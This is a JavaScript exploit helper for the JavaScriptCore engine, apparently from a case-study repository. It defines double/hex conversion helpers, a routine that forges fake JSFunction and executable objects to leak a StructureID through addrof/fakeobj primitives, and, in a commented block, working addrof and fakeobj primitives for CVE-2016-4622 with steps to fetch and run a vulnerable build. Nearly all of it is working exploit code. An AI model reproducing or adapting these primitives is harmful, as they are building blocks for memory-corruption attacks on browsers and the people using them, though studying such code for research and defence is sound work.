// for Hacker which too lazy to use awesome Int64 library
// written by @y0ny0ns0n

let ab = new ArrayBuffer(0x10);
let u32 = new Uint32Array(ab);
let f64 = new Float64Array(ab);

// convert double to hex string
function d2h(v) {
        f64[1] = v;
        let hi = u32[3].toString(16).slice(0, 8).padStart(8, '0');
        let lo = u32[2].toString(16).slice(0, 8).padStart(8, '0');
        return "0x" + hi.toString(16) + lo.toString(16);
}

// convert number to double
// range = 0 ~ 0xff00000000000000
function u2d(v) {
        u32[2] = v % 0x100000000;
        u32[3] = (v - u32[2]) / 0x100000000;
        return f64[1];
}

// leak m_structureID
// presented by @ThomasKing2014
// https://bit.ly/37UOtsY
// based on commit cb9ca26b, maybe you need to modify offset
function leak_structureID(obj, addrof, fakeobj) {

        let fake_UnlinkedFunctionExecutable = {
                pad1: 1,
                pad2: 2,
                pad3: 3,
                pad4: 4, // BYTE m_sourceParseMode == offset 0x37
                pad5: 5,
                pad6: 6,
                pad7: 7,
                pad8: 8,
                m_name: {} // offset 0x50, also identifier
        };

        let fake_FunctionExecutable = {
                pad1: 1,
                pad2: 2,
                pad3: 3,
                pad4: 4,
                pad5: 5,
                pad6: 6,
                pad7: 7,
                pad8: 8,
                m_unlinkedExecutable: fake_UnlinkedFunctionExecutable // offset 0x50
        };

        // m_type 0x19 == JSFunctionType
        let fake_JSFunction = {
                JSCell: u2d(0x0000190000000000),
                butterfly: {},
                m_scope: 0,
                m_executable: fake_FunctionExecutable
        };

        /*
        condition check on JSC::functionProtoFuncToString
                fake_JSFunction.JSCell.m_type == JSFunctionType &&
                fake_FunctionExecutable.JSCell.m_type != NativeExecutableType &&
                fake_UnlinkedFunctionExecutable.m_sourceParseMode != SetterMode &&

        condition check on JSC::JSFunction::name
                fake_FunctionExecutable.JSCell.m_type != NativeExecutableType &&
                fake_UnlinkedFunctionExecutable.m_name != NULL
        */

        f64[0] = addrof(fake_JSFunction);
        u32[0] += 0x10;
        let target = fakeobj(f64[0]);

        // OOB issue because JSCell of fake_JSFunction was boxed
        // cannot use fake_JSFunction as fake_name, so I create fakeobj for m_name
        f64[0] = addrof(obj);
        u32[2] = 8;                // length of name
        u32[3] = u32[0] - 0x10000; // prevent boxing
        u32[0] = u32[1];

        let fake_name = {
        a : 0,      // |       flags      |      useless      |
                b: f64[1],  // | Low 32bit of obj |       length      |
                c: f64[0]   // |      useless     | High 32bit of obj |
        };

        f64[0] = addrof(fake_name);
        u32[0] += 0x14; // align magic

        fake_UnlinkedFunctionExecutable.m_name = fakeobj(f64[0]);

        let name = Function.prototype.toString.call(target);

        let structure_ID = 0;
        for(let i = 0; i < 4; i++) {
                structure_ID += (name.charCodeAt(9+i) << (8*i));
                if(structure_ID > 0x100)
                        break;
        }

        return structure_ID;
}

/****************************************************************************************
// CVE-2016-4622
// https://github.com/y0ny0ns0n/JavaScriptCore-Case-Study#cve-list
// mega-get https://mega.nz/#!1ypkjAbY!hd2y5BfvmcOPs9a5nboIxFRth184UdP1rsbxZmzjdQ0 .
// unzip CVE-2016-4622.zip -d CVE-2016-4622 && cd CVE-2016-4622
// LD_LIBRARY_PATH=./lib bin/jsc for_jsc.js

function addrof(obj) {
        let a = [];
        for(let i = 0; i < 100; i++)
                a.push(i+0.123);

        return a.slice(0, {valueOf: function(){
                a.length = 0;
                a = [obj];
                return 10;
        }})[4];
}

function fakeobj(addr) {
        let a = [];
        for(let i = 0; i < 100; i++)
                a.push({});

        return a.slice(0, {valueOf: function(){
                a.length = 0;
                a = [addr];
                return 10;
        }})[4];
}

let leakme = {a:0x1234, b:0x5678};
print(leak_structureID(leakme, addrof, fakeobj));
print(describe(leakme));
****************************************************************************************/
